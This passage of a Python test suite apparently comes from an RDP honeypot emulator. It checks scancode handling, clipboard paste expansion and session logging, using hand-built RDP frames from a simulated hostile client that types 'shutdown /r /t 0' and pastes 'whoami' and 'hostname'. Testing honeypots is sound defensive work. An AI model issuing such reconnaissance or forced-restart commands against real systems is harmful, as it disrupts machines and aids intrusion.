        recorder.on_scancode(flags, code)
    assert recorder.take_actions() == [("special", "ctrl+v"), ("special", "ctrl+c")]
    assert recorder.summary()["typed"] == ""

    recorder.on_scancode(down, 0x5B)  # Win goes down and its key-up is lost
    recorder.on_scancode(down, 0x1E)
    assert recorder.take_actions() == []  # swallowed as a Win combination...
    recorder.on_sync()  # ...until the client regains focus
    recorder.on_scancode(down, 0x1E)
    assert recorder.take_actions() == [("char", "a")]


def test_ctrl_v_pastes_the_visitors_clipboard_line_by_line():
    from honeypot_mcp.engines.rdp_session import _expand_paste

    expanded = _expand_paste(
        [("char", "x"), ("special", "ctrl+v"), ("char", "y")], "whoami\r\nhostname\x1b"
    )
    assert "".join(a[1] for a in expanded) == "xwhoami\nhostname" + "y"  # control chars dropped
    assert len(_expand_paste([("special", "ctrl+v")], "z" * 5000)) == 500


async def test_shutdown_from_the_console_ends_the_session_and_says_so():
    """Typing `shutdown /r` takes the machine, and so the connection, away: the session ends
    with a record saying the visitor logged off, as the real thing would drop them."""
    import struct

    from honeypot_mcp.engines import rdp_session as rs

    letters = {lower: code for code, (lower, _upper) in rs._KEYS.items()}

    def keys(text: str) -> list[tuple[int, int]]:
        return [(0, letters[c]) for c in text]

    sequence = [(0, 0x5B), (0, 0x13), (0x8000, 0x13), (0x8000, 0x5B)]  # Win+R
    sequence += keys("shutdown /r /t 0\n")
    events = b"".join(struct.pack("<IHHHH", 0, 0x0004, flags, code, 0) for flags, code in sequence)
    payload = struct.pack("<HH", len(sequence), 0) + events
    body = struct.pack("<IBBHBBH", 0x103EA, 0, 1, len(payload) + 4, 0x1C, 0, 0) + payload
    pdu = struct.pack("<HHH", len(body) + 6, 0x17, rs.CLIENT_USER) + body
    mcs = (
        b"\x64"
        + struct.pack(">HH", rs.CLIENT_USER - 1001, rs.IO_CHANNEL)
        + b"\x70"
        + rs.per_length(len(pdu))
        + pdu
    )
    frame = b"\x03\x00" + struct.pack(">H", len(mcs) + 7) + b"\x02\xf0\x80" + mcs
    result, _written, _ = await _run_hostile_client(_client_frames(font_lists=1) + frame)
    assert result["ended_by"] == "visitor logged off"
    assert result["commands"] == [{"shell": "run", "input": "shutdown /r /t 0"}]
